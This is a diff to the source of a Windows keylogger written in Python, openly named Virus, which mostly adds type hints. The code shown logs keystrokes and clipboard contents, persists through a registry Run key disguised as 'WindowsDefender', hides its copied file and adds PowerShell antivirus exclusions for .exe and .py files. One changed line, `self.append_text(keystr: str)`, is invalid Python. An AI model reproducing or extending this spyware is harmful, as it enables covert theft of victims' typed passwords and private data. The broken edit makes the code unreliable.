@@ -5,7 +5,6 @@ import winreg
 import ctypes
 import sys
 import os
-
 from pynput.keyboard import Listener, KeyCode, Key
 from datetime import datetime
 from queue import Queue
@@ -94,7 +93,7 @@ class Virus(object):
                 if not keystr in self.cool_texts:
                     keystr = f"\x00<^{chr(key.vk)}>\x00"
 
-                self.append_text(keystr)
+                self.append_text(keystr: str)
 
                 if key.char.encode() == b"\x16":
                     self.append_text(f"\x00<^paste: {pyperclip.paste()}>\x00")
@@ -124,7 +123,7 @@ class Virus(object):
         finally:
             self.last_press = timenow
     
-    def append_text(self, text):
+    def append_text(self, text: str):
         self.texts.append(text)
 
         if len("".join(self.texts)) >= self.MAX_TEXTS:
@@ -158,7 +157,7 @@ def add_to_startup():
 
     copy_file(src, dst)
 
-def get_file_location():
+def get_file_location() -> str:
     return os.getcwd() + "\\" + sys.argv[0]
 
 def add_regkey():
@@ -177,22 +176,22 @@ def add_regkey():
     winreg.SetValueEx(key, "WindowsDefender", None, winreg.REG_SZ, dst)
     winreg.CloseKey(key)
 
-def copy_file(src, dst):
+def copy_file(src: str, dst: str):
     kernel32.CopyFileW.argtypes = [ctypes.c_wchar_p, ctypes.c_wchar_p, ctypes.c_bool]
     kernel32.CopyFileW(src, dst, False)
 
     if VirusConfig.HIDE_FILE:
         hide_file(dst)
 
-def hide_file(filepath):
+def hide_file(filepath: str):
     kernel32.SetFileAttributesW.argtypes = [ctypes.c_wchar_p, ctypes.c_int]
     kernel32.SetFileAttributesW(filepath, 0x2)
 
 def add_av_exclusion():
     subprocess.Popen("powershell Add-MpPreference -ExclusionExtension exe, py", shell=True)
 
-def acquire_mutex(mutex_id):
-    def _acquire_mutex(path):
+def acquire_mutex(mutex_id: str) -> bool:
+    def _acquire_mutex(path: str):
         mutex = open(path, "a")
         
         while True:
